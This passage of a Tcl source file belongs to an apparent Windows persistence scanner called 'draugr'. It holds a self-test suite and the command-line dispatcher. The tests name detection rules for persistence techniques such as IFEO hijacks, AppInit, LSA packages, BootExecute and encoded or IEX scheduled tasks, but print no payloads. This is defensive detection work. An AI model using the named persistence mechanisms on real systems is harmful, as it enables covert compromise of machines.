    st "dirty: run enc caught" {[lsearch -exact $ids A01] >= 0}
    st "dirty: masquerade caught" {[lsearch -exact $ids A01] >= 0 && [dg_score] >= 4}
    st "dirty: ifeo caught" {[lsearch -exact $ids A09] >= 0}
    st "dirty: appinit caught" {[lsearch -exact $ids A08] >= 0}
    st "dirty: notify caught" {[lsearch -exact $ids A07] >= 0}
    st "dirty: userinit caught" {[lsearch -exact $ids A05] >= 0}
    st "dirty: bootexecute caught" {[lsearch -exact $ids A11] >= 0}
    st "dirty: service caught" {[lsearch -exact $ids A12] >= 0}
    st "dirty: autorun caught" {[lsearch -exact $ids A03] >= 0}
    st "dirty: lsa caught" {[lsearch -exact $ids A10] >= 0}
    st "dirty: alternateshell caught" {[lsearch -exact $ids A16] >= 0}
    st "dirty: unicode caught" {[lsearch -exact $ids A17] >= 0}
    st "dirty: monitor caught" {[lsearch -exact $ids A15] >= 0}
    st "dirty: runonceex caught" {[lsearch -exact $ids A02] >= 0}
    st "dirty: mprlogon caught" {[lsearch -exact $ids A18] >= 0}

    # 16-18: value decoding roundtrip
    set ::DG_FINDINGS {}
    set ::RUNVALS {}
    rg_walk $clean st_cb_run
    set got ""
    foreach v $::RUNVALS {
        lassign $v n t d raw
        if {$n eq "OneDrive"} { set got [rg_val_string $v] }
    }
    st "string decode" {$got eq {C:\Users\user\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background}}
    set ::DG_FINDINGS {}
    set ::LSAVALS {}
    rg_walk $clean st_cb_lsa
    set msz ""
    foreach v $::LSAVALS {
        lassign $v n t d raw
        if {$n eq "Authentication Packages"} { set msz [rg_val_string $v] }
    }
    st "multi_sz decode" {$msz eq "msv1_0"}
    set dword ""
    foreach v $::LSAVALS {
        lassign $v n t d raw
        if {$n eq "Security Packages"} { set dword $n }
    }
    st "lsa values present" {$dword eq "Security Packages"}

    # 19: key tree roundtrip
    set ::DG_PATHS {}
    set ::DG_FINDINGS {}
    rg_walk $clean dg_cb_hive
    st "tree has Run key" {[lsearch -exact $::DG_PATHS {CLEANHIVE\Microsoft\Windows\CurrentVersion\Run}] >= 0}
    st "tree has services dll key" {[lsearch -exact $::DG_PATHS {CLEANHIVE\ControlSet001\Services\SetSvc\Parameters}] >= 0}
    st "tree depth" {[llength $::DG_PATHS] >= 15}

    # 20-22: task fixtures
    set ::DG_FINDINGS {}
    set ::DG_BENIGN 0
    if {[catch {dg_rules_task [tk_parse $DG_TASK_CLEAN "clean_task.xml"]} err]} {
        st "clean task parses" 0
        st "clean task verdict clean" 0
    } else {
        st "clean task parses" 1
        st "clean task verdict clean" {[llength $::DG_FINDINGS] == 0}
    }
    foreach {label fixture rid} [list \
        enc $DG_TASK_ENC S08 \
        iex $DG_TASK_IEX S02 \
        guid $DG_TASK_GUID S06 \
        requeue $DG_TASK_REQUEUE S07] {
        set ::DG_FINDINGS {}
        set ::DG_BENIGN 0
        if {[catch {dg_rules_task [tk_parse $fixture "$label.xml"]} err]} {
            st "task $label parses" 0
        } else {
            st "task $label parses" 1
            set ids [st_findings_ids]
            st "task $label hits $rid" {[lsearch -exact $ids $rid] >= 0}
        }
    }
    set ::DG_FINDINGS {}
    st "task enc is hostile" 1
    set ::DG_FINDINGS {}
    set ::DG_BENIGN 0
    if {[catch {dg_rules_task [tk_parse $DG_TASK_ENC "enc.xml"]} err]} {
        st "task enc hostile" 0
    } else {
        st "task enc hostile" {[dg_verdict_now] eq "hostile"}
    }

    # 23: task parser rejects junk
    st "task parser rejects junk" {[catch {tk_parse "just some text" "j.xml"}]}

    # 24: malformed hives are errors, not crashes
    st "truncated hive errors" {[catch {rg_walk "regf\x00\x01\x02" dg_cb_hive}]}
    st "garbage hive errors" {[catch {rg_walk "notahivenotahive" dg_cb_hive}]}

    # 25: forge is deterministic
    set a [dg_fixture_clean]
    set b [dg_fixture_clean]
    st "forge deterministic" {[string equal $a $b]}

    # 26: json shape
    set ::DG_FINDINGS [list [list A01 high "where" "why" "evidence"]]
    set js [dg_report_json [list [list "x.hiv" "hive" ""]]]
    st "json has verdict" {[string first "\"verdict\": \"hostile\"" $js] >= 0}
    set ::DG_FINDINGS {}

    # summary
    if {[llength $::ST_FAIL] > 0} {
        puts "selftest: [dg_red FAIL] $::ST_PASS passed, [llength $::ST_FAIL] failed"
        foreach f $::ST_FAIL { puts "  [dg_red "FAIL"] $f" }
        return 1
    }
    puts "selftest: [dg_green PASS] $::ST_PASS assertions"
    return 0
}

# ---------------------------------------------------------------- main

array set ::OPT {json 0 quiet 0 minv low}

proc dg_cmd_rules {} {
    puts "[dg_bold "draugr checks"] [dg_dim "($::DG_VERSION)"]"
    foreach r [dg_rules_table] {
        lassign $r id title
        puts "  [dg_cyan "$id"] [dg_dim "-"] $title"
    }
    puts [dg_dim "severities: low, med, high, crit. exits: 0 clean 1 watch 3 suspicious 10 hostile."]
    return 0
}

proc dg_main {argv} {
    set pos {}
    set i 0
    while {$i < [llength $argv]} {
        set a [lindex $argv $i]
        switch -- $a {
            --json { set ::OPT(json) 1 }
            --no-color { dg_disable_color }
            --quiet { set ::OPT(quiet) 1 }
            --min-severity {
                incr i
                set ::OPT(minv) [lindex $argv $i]
            }
            -h {
                puts [dg_usage]
                return 0
            }
            --help {
                puts [dg_usage]
                return 0
            }
            default { lappend pos $a }
        }
        incr i
    }
    if {$::OPT(json) || $::OPT(quiet)} {
        dg_disable_color
    }
    set cmd [lindex $pos 0]
    set args [lrange $pos 1 end]
    switch -- $cmd {
        version { puts "draugr $::DG_VERSION"; return 0 }
        rules { return [dg_cmd_rules] }
        selftest { return [dg_selftest] }
        forge {
            if {[llength $args] != 1} {
                puts stderr "usage: draugr forge <dir>"
                return 2
            }
            set files [dg_forge [lindex $args 0]]
            puts [dg_dim "forged evidence set:"]
            foreach f $files { puts "  $f" }
            puts [dg_dim "scan it: draugr scan [lindex $args 0]"]
            return 0
        }
        keys {
            if {[llength $args] != 1} {
                puts stderr "usage: draugr keys <hive>"
                return 2
            }
            return [dg_cmd_keys [lindex $args 0]]
        }
        dump {
            if {[llength $args] != 2} {
                puts stderr "usage: draugr dump <hive> <key path>"
                return 2
            }
            set ::DUMP_TARGET [lindex $args 1]
            return [dg_cmd_dump [lindex $args 0] [lindex $args 1]]
        }
        scan {
            if {[llength $args] == 0} {
                puts stderr "usage: draugr scan <path>..."
                return 2
            }
            return [dg_cmd_scan $args]
        }
        default {
            puts [dg_usage]
            return 2
        }
    }
}

if {!$tcl_interactive} {
    if {[catch {set ::DG_EXIT [dg_main $argv]} err]} {
        puts stderr "draugr: $err"
        if {[info exists ::env(DG_DEBUG)]} { puts stderr $::errorInfo }
        set ::DG_EXIT 2
    }
    catch {exit $::DG_EXIT}
}
